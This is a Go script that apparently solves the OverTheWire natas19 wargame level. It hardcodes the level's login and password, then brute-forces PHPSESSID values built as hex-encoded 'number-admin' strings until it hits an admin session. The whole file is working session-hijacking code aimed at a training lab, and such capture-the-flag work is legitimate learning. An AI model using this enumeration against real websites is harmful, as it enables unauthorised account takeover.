package main

import (
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strconv"
	"strings"
)

var (
	username = "natas19"
	password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
	url_     = "http://natas19.natas.labs.overthewire.org/"
	max_val  = 640
)

func main() {
	payload := "admin"
	for i := 0; i < max_val; i++ {
		if pentest(hex.EncodeToString([]byte(strconv.Itoa(i) + "-" + payload))) {
			break
		}
	}
}

func pentest(sessionId string) bool {
	client := &http.Client{}
	postData := url.Values{}
	//postData.Set("username", "admin")
	req, err := http.NewRequest("POST", url_, strings.NewReader(postData.Encode()))
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Content-Length", strconv.Itoa(len(postData.Encode())))
	req.SetBasicAuth(username, password)
	req.AddCookie(&http.Cookie{Name: "PHPSESSID", Value: sessionId})

	res, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	body, _ := ioutil.ReadAll(res.Body)
	if !strings.Contains(string(body), "You are logged") {
		fmt.Println(string(body))
		return true
	}
	return false
}
